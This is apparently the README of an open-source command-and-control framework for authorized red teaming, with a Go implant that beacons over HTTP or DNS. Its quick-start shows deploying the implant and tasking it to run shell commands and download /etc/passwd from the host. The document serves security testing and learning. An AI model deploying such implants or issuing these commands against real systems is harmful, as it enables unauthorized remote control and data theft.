<div align="center">

# `MERIDIAN`

### Modular C2 Framework for Authorized Red Team Operations

![Python](https://img.shields.io/badge/Python-3.10+-3776AB?style=flat-square&logo=python&logoColor=white)
![Go](https://img.shields.io/badge/Go-1.24+-00ADD8?style=flat-square&logo=go&logoColor=white)
![License](https://img.shields.io/badge/License-MIT-00ff88?style=flat-square)
![CI](https://img.shields.io/badge/CI-Passing-brightgreen?style=flat-square)
![Protocol](https://img.shields.io/badge/Protocol-v1-blueviolet?style=flat-square)

```
   ┌─────────────────────────────────────────────────────────┐
   │                                                         │
   │   operator console                                      │
   │         │                                               │
   │         ▼                                               │
   │   ┌──────────┐     ┌──────────┐                         │
   │   │  server   │────▶│ implant  │                         │
   │   │ (Python)  │◀────│  (Go)    │                         │
   │   └────┬──────┘     └──────────┘                        │
   │        │                                                │
   │   ┌────┴────┐                                           │
   │   │  SQLite  │  encrypted-at-rest                       │
   │   └─────────┘                                           │
   │                                                         │
   │   transports: HTTP(S) • WebSocket • DNS                 │
   │   crypto: X25519 + HKDF-SHA256 + AES-256-GCM           │
   │                                                         │
   └─────────────────────────────────────────────────────────┘
```

**Built from scratch. No Metasploit. No Covenant. Just code.**

</div>

---

## What is Meridian?

Meridian is a **from-scratch C2 framework** designed for lab environments and authorized engagements. It's not a wrapper around existing tools — every component is built independently:

- **Server** — Python async core with aiohttp, SQLite persistence, and a rich operator console
- **Implant** — Single static Go binary, **zero dependencies** (stdlib only)
- **Protocol** — Custom wire format with real end-to-end encryption
- **Transports** — HTTP(S)/WebSocket and DNS (chunked TXT channels)

> **⚠️ Authorized use only.** Use only on systems you own or have explicit written permission to test.

---

## Why Meridian?

| | Metasploit/Covenant | Meridian |
|---|---|---|
| **Dependencies** | Heavy (Ruby, .NET, Docker) | Light (Python + Go) |
| **Implant** | Large, multi-file | Single static binary |
| **Crypto** | Often bolted-on | End-to-end by design |
| **DNS** | Rarely included | Native chunked TXT |
| **Learning** | Black box | Readable source |

---

## Features

### Core

- **Dual transport** — HTTP(S)/WS and DNS with automatic failover
- **Real crypto** — X25519 key exchange, HKDF-SHA256 derivation, AES-256-GCM envelopes
- **Beaconing** — Configurable interval + jitter, exponential backoff (capped at 1h)
- **Dependency-free implant** — Single Go binary, stdlib only

### Operator

- **Interactive console** — Rich TUI with session tracking and task dispatch
- **File ops** — Upload/download with base64 encoding
- **Reporting** — Markdown/JSON engagement reports
- **Audit** — Structured JSONL event log

### Extensible

- **Module system** — Server-side modules with result hooks
- **Custom transports** — Drop in new listeners cleanly
- **Plugin architecture** — Extend without forking

---

## Quick Start

### 1. Install

```bash
git clone https://github.com/s1d9e/meridian.git
cd meridian
python3 -m venv .venv
.venv/bin/pip install -e ".[dev]"
```

### 2. Start Server

```bash
.venv/bin/meridian
```

```
meridian> listener add http 8080
meridian> listener start http
```

### 3. Build Implant

```bash
cd implant
go build -o bin/parallax .
```

### 4. Deploy

```bash
# HTTP
MERIDIAN_HTTP=http://10.0.0.5:8080 ./bin/parallax

# Or DNS
MERIDIAN_DNS=10.0.0.53:5353 MERIDIAN_DNS_DOMAIN=c2.test ./bin/parallax
```

### 5. Interact

```
meridian> sessions
● lab01  linux/amd64  root  10.0.0.5  dns   30s/20%

meridian> use lab01
meridian> exec id
meridian> shell ls -la /tmp
meridian> download /etc/passwd
meridian> results
```

---

## Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                     OPERATOR CONSOLE                        │
│  ┌─────────┐  ┌─────────┐  ┌─────────┐  ┌──────────────┐  │
│  │ sessions│  │  tasks  │  │ results │  │   modules    │  │
│  └────┬────┘  └────┬────┘  └────┬────┘  └──────┬───────┘  │
│       └────────────┼────────────┼───────────────┘          │
│                    ▼                                        │
│              ┌──────────┐                                   │
│              │  server  │                                   │
│              │  (core)  │                                   │
│              └────┬─────┘                                   │
│                   │                                         │
│    ┌──────────────┼──────────────┐                          │
│    ▼              ▼              ▼                          │
│ ┌──────┐    ┌──────────┐    ┌────────┐                     │
│ │ HTTP │    │ WebSocket│    │  DNS   │                     │
│ └──┬───┘    └────┬─────┘    └───┬────┘                     │
│    │             │              │                           │
└────┼─────────────┼──────────────┼───────────────────────────┘
     │             │              │
     ▼             ▼              ▼
┌─────────────────────────────────────────────────────────────┐
│                        IMPLANT                              │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌────────────┐  │
│  │ beacon   │  │ transport│  │  tasks   │  │  sysinfo   │  │
│  └──────────┘  └──────────┘  └──────────┘  └────────────┘  │
│                                                             │
│  Single static Go binary — zero dependencies                │
└─────────────────────────────────────────────────────────────┘
```

---

## Tech Stack

| Component | Technology |
|-----------|------------|
| Server | Python 3.10+, asyncio, aiohttp |
| Console | Rich + Click |
| Storage | SQLite (AES-GCM at rest) |
| Implant | Go 1.24+, stdlib only |
| Crypto | X25519, HKDF-SHA256, AES-256-GCM |
| HTTP | REST API + WebSocket |
| DNS | Chunked TXT with base32 encoding |

---

## Documentation

| Document | Description |
|----------|-------------|
| [Protocol Spec](docs/protocol.md) | Wire protocol v1: framing, crypto, transports |
| [Architecture](docs/ARCHITECTURE.md) | Server/implant layout, beacon flow |
| [OPSEC Guide](docs/OPSEC.md) | Operational security tradeoffs |
| [Modules](docs/MODULES.md) | Writing custom server-side modules |
| [Security](SECURITY.md) | Threat model, key handling |

---

## Development

```bash
# Lint
.venv/bin/ruff check meridian tests

# Test Python
.venv/bin/pytest

# Test Go
cd implant && go vet ./... && go test ./...
```

CI runs on every push (see `.github/workflows/ci.yml`).

---

## Contributing

1. Fork the repo
2. Create a feature branch
3. Commit with clear messages
4. Open a PR

See [CONTRIBUTING.md](CONTRIBUTING.md) for details.

---

## License

MIT — see [LICENSE](LICENSE).

**Keep it legal.** Authorization first. This tool is for educational and authorized testing purposes only.

---

<div align="center">

**Built with care by [s1d9e](https://github.com/s1d9e)**

</div>
